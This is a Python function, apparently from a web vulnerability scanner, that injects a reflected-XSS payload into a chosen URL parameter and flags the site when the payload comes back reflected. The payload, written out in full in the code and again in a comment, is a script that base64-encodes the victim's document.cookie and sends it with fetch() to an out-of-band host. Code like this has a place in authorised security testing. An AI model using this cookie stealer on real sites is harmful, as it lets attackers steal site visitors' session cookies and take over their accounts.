import aiohttp
import asyncio
from core.oast import oast_manager
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

async def exploit_xss_stealer(url, param, log_callback=None, headers=None, proxy=None):
    """
    Attempts to inject a Cookie Stealer payload via Reflected XSS.
    Relies on OAST Manager to catch the incoming connection.
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    oast_domain = oast_manager.get_oast_domain()
    
    # Payload: Cookie Stealer
    # We use a polyglot-ish payload or standard script
    # <script>fetch('http://OAST/steal?c='+btoa(document.cookie))</script>
    payload = f"\"><script>fetch('http://{oast_domain}/steal?c='+btoa(document.cookie))</script>"
    
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if param and param in params:
            p_copy = params.copy()
            # Replace param value with payload
            p_copy[param] = [payload]
            exploit_url = urlunparse(parsed._replace(query=urlencode(p_copy, doseq=True)))
            
            async with aiohttp.ClientSession(headers=final_headers) as session:
                try:
                    # Send the exploit
                    if log_callback: log_callback(f"   üç™ XSS Stealer: Sending payload to {param}...")
                    async with session.get(exploit_url, timeout=5, ssl=False, proxy=proxy) as resp:
                         # We don't necessarily expect a response body with the cookie, 
                         # the browser/victim would execute it. 
                         # But here we are just proving we can inject the stealer.
                         # If we see our payload reflected, it's a confirmed staging.
                         text = await resp.text()
                         if payload in text:
                             findings.append({
                                "type": "XSS Weaponization (Cookie Stealer)",
                                "severity": "Critical",
                                "detail": "Successfully injected OAST Cookie Stealer payload.",
                                "evidence": f"Payload Reflected: {payload}",
                                "remediation": "Sanitize output and use HttpOnly cookies."
                            })
                except Exception: pass
    except Exception: pass
    
    return findings
